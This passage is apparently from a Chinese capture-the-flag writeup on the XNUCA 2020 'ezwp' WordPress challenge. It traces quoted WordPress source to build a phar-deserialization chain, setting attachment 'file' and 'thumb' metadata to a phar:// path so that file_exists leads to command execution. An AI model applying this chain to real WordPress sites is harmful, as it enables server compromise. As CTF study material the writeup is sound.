class="title">false</span>,</span></span><br><span class="line"><span class="class">				&#x27;<span class="title">send</span>&#x27;       =&gt; <span class="title">false</span>,</span></span><br><span class="line"><span class="class">				&#x27;<span class="title">delete</span>&#x27;     =&gt; <span class="title">false</span>,</span></span><br><span class="line"><span class="class">				&#x27;<span class="title">show_title</span>&#x27; =&gt; <span class="title">false</span>,</span></span><br><span class="line"><span class="class">				&#x27;<span class="title">errors</span>&#x27;     =&gt; ! <span class="title">empty</span>($<span class="title">errors</span>[$<span class="title">att_id</span> ] ) ? $<span class="title">errors</span>[$<span class="title">att_id</span> ] : <span class="title">null</span>,</span></span><br><span class="line"><span class="class">			)</span></span><br><span class="line"><span class="class">		);</span></span><br><span class="line"><span class="class">		?&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">     //...</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure>



<p> 到了这里，已经进入了一个前端页面中，代表我们可以直接访问了，访问地址为 “/wp-admin/media.php”。可以看到在一个前端输出中调用了 get_media_item，该输出位于一个 case 中，条件为 action 参数是 edit，并且需要一个合法的 attachment_id 参数，如下图所示。需要注意的是该利用链中的所有的 id（包括 attachment_id 或者 post_id 等等）均指上传的附件 id。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/1.png"></p>
<p> 测试一下该利用链是否可以跳转到 file_exists 函数，手动 patch 一下源码，加了一个 die，之所以加在 if 的前面是因为还没有设置 imagedata。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="variable">$imagedata</span> = <span class="title function_ invoke__">wp_get_attachment_metadata</span>(<span class="variable">$post</span>-&gt;ID );</span><br><span class="line"><span class="keyword">if</span> (! <span class="title function_ invoke__">is_array</span>(<span class="variable">$imagedata</span> ) ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">get_attached_file</span>(<span class="variable">$post</span>-&gt;ID );</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$imagedata</span>[<span class="string">&#x27;thumb&#x27;</span>] ) ) &#123;</span><br><span class="line">    <span class="variable">$thumbfile</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$file</span> ), <span class="variable">$imagedata</span>[<span class="string">&#x27;thumb&#x27;</span>], <span class="variable">$file</span> );</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$thumbfile</span> ) ) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>



<p> 可以成功触发。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/2.png"></p>
<p> 最终的漏洞利用链如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">switch case &#x27;edit&#x27; [wp-admin/media.php:47] -&gt;</span><br><span class="line">get_media_item [wp-admin/media.php:142] -&gt;</span><br><span class="line">get_attachment_fields_to_edit [wp-admin/includes/media.php:1596] -&gt;</span><br><span class="line">image_size_input_fields [wp-admin/includes/media.php:1459] -&gt;</span><br><span class="line">image_downsize [wp-admin/includes/media.php:1156] -&gt;</span><br><span class="line">wp_get_attachment_thumb_file [wp-includes/media.php:244] -&gt;</span><br><span class="line">file_exists (&quot;phar://.....&quot;) [wp-includes/post.php:6148] -&gt;</span><br><span class="line">execute command</span><br></pre></td></tr></table></figure>



<p> 接下来就需要控制 _wp_attachment_metadata 与 _wp_attached_file 字段的值，其中 _wp_attachment_metadata 字段就是 imagedata 的值，_wp_attached_file 就是 file 的值，控制 file 为 <code>Z:\Z</code> 之后就要控制 imagedata [‘thumb’] 的值为 <code>phar://../wp-content/uploads/2020/12/a.gif/test.txt</code>，a.gif 就是上传的附件。</p>
<p> 在以前的 WordPress 中可以通过 meta_input 参数就可以直接控制数据库中各表的数据，但是之后 WordPress 补了这个洞，Patch 如下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-admin/includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns only allowed post data fields</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 5.0.1</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $post_data Array of post data. Defaults to the contents of $_POST.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|WP_Error Array of post data on success, WP_Error on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_wp_get_allowed_postdata</span>(<span class="params"> <span class="variable">$post_data</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$post_data</span> ) ) &#123;</span><br><span class="line">		<span class="variable">$post_data</span> = <span class="variable">$_POST</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Pass through errors.</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_wp_error</span>(<span class="variable">$post_data</span> ) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$post_data</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">array_diff_key</span>(<span class="variable">$post_data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="keyword">array</span>(<span class="string">&#x27;meta_input&#x27;</span>, <span class="string">&#x27;guid&#x27;</span> ) ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 直接过滤了 meta_input 与 guid 参数，另外需要说明的是在官方的补丁中还包含了 file 参数，但是在该题目中却并没有（上面的源码是题目中的）这就导致了可以利用 file 参数控制 _wp_attachment_metadata 与 _wp_attached_file 字段。</p>
<h1 id="0x3-wp-attached-file"><a href="#0x3-wp-attached-file" class="headerlink" title="0x3 wp_attached_file"></a>0x3 wp_attached_file</h1><p> 首先需要修改 _wp_attached_file 字段。在 /wp-admin/post.php 中 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-admin/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span> ) &#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">    	<span class="keyword">case</span> <span class="string">&#x27;editpost&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">check_admin_referer</span>(<span class="string">&#x27;update-post_&#x27;</span> . <span class="variable">$post_id</span> );</span><br><span class="line"></span><br><span class="line">		<span class="variable">$post_id</span> = <span class="title function_ invoke__">edit_post</span>();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Session cookie flag that the post was saved.</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;wp-saving-post&#x27;</span>] ) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;wp-saving-post&#x27;</span>] === <span class="variable">$post_id</span> . <span class="string">&#x27;-check&#x27;</span> ) &#123;</span><br><span class="line">			<span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;wp-saving-post&#x27;</span>, <span class="variable">$post_id</span> . <span class="string">&#x27;-saved&#x27;</span>, <span class="title function_ invoke__">time</span>() + DAY_IN_SECONDS, ADMIN_COOKIE_PATH, COOKIE_DOMAIN, <span class="title function_ invoke__">is_ssl</span>());</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="title function_ invoke__">redirect_post</span>(<span class="variable">$post_id</span> ); <span class="comment">// Send user on their way while we keep working.</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 流程转入 edit_post 函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-admin/includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update an existing post with values provided in $_POST.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If post data is passed as an argument, it is treated as an array of data</span></span><br><span class="line"><span class="comment"> * keyed appropriately for turning into a post object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If post data is not passed, the $_POST global variable is used instead.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@global</span> wpdb $wpdb WordPress database abstraction object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $post_data Optional. Defaults to the $_POST global.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int Post ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_post</span>(<span class="params"> <span class="variable">$post_data</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">//..</span></span><br><span class="line">	<span class="variable">$post_data</span> = <span class="title function_ invoke__">_wp_translate_postdata</span>(<span class="literal">true</span>, <span class="variable">$post_data</span> );</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_wp_error</span>(<span class="variable">$post_data</span> ) ) &#123;</span><br><span class="line">		<span class="title function_ invoke__">wp_die</span>(<span class="variable">$post_data</span>-&gt;<span class="title function_ invoke__">get_error_message</span>());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$translated</span> = <span class="title function_ invoke__">_wp_get_allowed_postdata</span>(<span class="variable">$post_data</span> );</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// Attachment stuff.</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="string">&#x27;attachment&#x27;</span> === <span class="variable">$post_data</span>[<span class="string">&#x27;post_type&#x27;</span>] ) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$post_data</span>[<span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>] ) ) &#123;</span><br><span class="line">			<span class="variable">$image_alt</span> = <span class="title function_ invoke__">wp_unslash</span>(<span class="variable">$post_data</span>[<span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>] );</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">get_post_meta</span>(<span class="variable">$post_ID</span>, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, <span class="literal">true</span> ) !== <span class="variable">$image_alt</span> ) &#123;</span><br><span class="line">				<span class="variable">$image_alt</span> = <span class="title function_ invoke__">wp_strip_all_tags</span>(<span class="variable">$image_alt</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">				<span class="comment">//update_post_meta () expects slashed.</span></span><br><span class="line">				<span class="title function_ invoke__">update_post_meta</span>(<span class="variable">$post_ID</span>, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, <span class="title function_ invoke__">wp_slash</span>(<span class="variable">$image_alt</span> ) );</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$attachment_data</span> = <span class="keyword">isset</span>(<span class="variable">$post_data</span>[<span class="string">&#x27;attachments&#x27;</span>][<span class="variable">$post_ID</span> ] ) ? <span class="variable">$post_data</span>[<span class="string">&#x27;attachments&#x27;</span>][<span class="variable">$post_ID</span> ] : <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">		<span class="comment">/** This filter is documented in wp-admin/includes/media.php */</span></span><br><span class="line">		<span class="variable">$translated</span> = <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;attachment_fields_to_save&#x27;</span>, <span class="variable">$translated</span>, <span class="variable">$attachment_data</span> );</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">	<span class="variable">$success</span> = <span class="title function_ invoke__">wp_update_post</span>(<span class="variable">$translated</span> );</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 其中 translated 保存了过滤后的 post 数据，由于题目中没有过滤 file 参数，所以这里的 translated 中依旧存在 file 参数。再看 wp_update_post 函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update a post with new post data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The date does not have to be set for drafts. You can set the date and it will</span></span><br><span class="line"><span class="comment"> * not be overridden.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array|object $postarr  Optional. Post data. Arrays are expected to be escaped,</span></span><br><span class="line"><span class="comment"> *                               objects are not. Default array.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool         $wp_error Optional. Allow return of WP_Error on failure. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int|WP_Error The post ID on success. The value 0 or WP_Error on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_update_post</span>(<span class="params"> <span class="variable">$postarr</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$wp_error</span> = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">	<span class="comment">// Merge old and new fields with new fields overwriting old ones.</span></span><br><span class="line">	<span class="variable">$postarr</span>                  = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$post</span>, <span class="variable">$postarr</span> );</span><br><span class="line">	<span class="variable">$postarr</span>[<span class="string">&#x27;post_category&#x27;</span>] = <span class="variable">$post_cats</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$clear_date</span> ) &#123;</span><br><span class="line">		<span class="variable">$postarr</span>[<span class="string">&#x27;post_date&#x27;</span>]     = <span class="title function_ invoke__">current_time</span>(<span class="string">&#x27;mysql&#x27;</span> );</span><br><span class="line">		<span class="variable">$postarr</span>[<span class="string">&#x27;post_date_gmt&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">wp_insert_post</span>(<span class="variable">$postarr</span>, <span class="variable">$wp_error</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 流程转入到 wp_insert_post。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Insert or update a post.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If the $postarr parameter has &#x27;ID&#x27; set to a value, then post will be updated.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can set the post date manually, by setting the values for &#x27;post_date&#x27;</span></span><br><span class="line"><span class="comment"> * and &#x27;post_date_gmt&#x27; keys. You can close the comments or open the comments by</span></span><br><span class="line"><span class="comment"> * setting the value for &#x27;comment_status&#x27; key.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 4.2.0 Support was added for encoding emoji in the post title, content, and excerpt.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 4.4.0 A &#x27;meta_input&#x27; array can now be passed to `$postarr` to add post meta data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_insert_post</span>(<span class="params"> <span class="variable">$postarr</span>, <span class="variable">$wp_error</span> = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="string">&#x27;attachment&#x27;</span> === <span class="variable">$postarr</span>[<span class="string">&#x27;post_type&#x27;</span>] ) &#123;</span><br><span class="line">		<span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$postarr</span>[<span class="string">&#x27;file&#x27;</span>] ) ) &#123;</span><br><span class="line">			<span class="title function_ invoke__">update_attached_file</span>(<span class="variable">$post_ID</span>, <span class="variable">$postarr</span>[<span class="string">&#x27;file&#x27;</span>] );</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$postarr</span>[<span class="string">&#x27;context&#x27;</span>] ) ) &#123;</span><br><span class="line">			<span class="title function_ invoke__">add_post_meta</span>(<span class="variable">$post_ID</span>, <span class="string">&#x27;_wp_attachment_context&#x27;</span>, <span class="variable">$postarr</span>[<span class="string">&#x27;context&#x27;</span>], <span class="literal">true</span> );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 直接传递 postarr [‘file’]，再看 update_attached_file。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update attachment file path based on attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Used to update the file path of the attachment, which uses post meta name</span></span><br><span class="line"><span class="comment"> * &#x27;_wp_attached_file&#x27; to store the path of the attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $file          File path for the attachment.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool True on success, false on failure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_attached_file</span>(<span class="params"> <span class="variable">$attachment_id</span>, <span class="variable">$file</span> </span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (! <span class="title function_ invoke__">get_post</span>(<span class="variable">$attachment_id</span> ) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the path to the attached file to update.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $file          Path to the attached file to update.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> int    $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="variable">$file</span> = <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;update_attached_file&#x27;</span>, <span class="variable">$file</span>, <span class="variable">$attachment_id</span> );</span><br><span class="line"></span><br><span class="line">	<span class="variable">$file</span> = <span class="title function_ invoke__">_wp_relative_upload_path</span>(<span class="variable">$file</span> );</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$file</span> ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">update_post_meta</span>(<span class="variable">$attachment_id</span>, <span class="string">&#x27;_wp_attached_file&#x27;</span>, <span class="variable">$file</span> );</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">delete_post_meta</span>(<span class="variable">$attachment_id</span>, <span class="string">&#x27;_wp_attached_file&#x27;</span> );</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 直接通过 update_post_meta 更新 _wp_attached_file 字段，最终导致 file 可控。</p>
<h1 id="0x4-wp-attachment-metadata"><a href="#0x4-wp-attachment-metadata" class="headerlink" title="0x4 wp_attachment_metadata"></a>0x4 wp_attachment_metadata</h1><p> 接下来修改 _wp_attachmen\t_metadata 字段，同样在在 /wp-admin/post.php 中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-admin/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span> ) &#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;editattachment&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">check_admin_referer</span>(<span class="string">&#x27;update-post_&#x27;</span> . <span class="variable">$post_id</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Don&#x27;t let these be changed.</span></span><br><span class="line">		<span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guid&#x27;</span>] );</span><br><span class="line">		<span class="variable">$_POST</span>[<span class="string">&#x27;post_type&#x27;</span>] = <span class="string">&#x27;attachment&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update the thumbnail filename.</span></span><br><span class="line">		<span class="variable">$newmeta</span>          = <span class="title function_ invoke__">wp_get_attachment_metadata</span>(<span class="variable">$post_id</span>, <span class="literal">true</span> );</span><br><span class="line">		<span class="variable">$newmeta</span>[<span class="string">&#x27;thumb&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;thumb&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="title function_ invoke__">wp_update_attachment_metadata</span>(<span class="variable">$post_id</span>, <span class="variable">$newmeta</span> );</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// Intentional fall-through to trigger the edit_post () call.</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;editpost&#x27;</span>:</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 有一个 wp_update_attachment_metadata，参数 newmeta [‘thumb’] 刚好就是我们需要的 imagedata [‘thumb’]。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Updates metadata for an attachment.</span></span><br><span class="line"><span class="comment"> 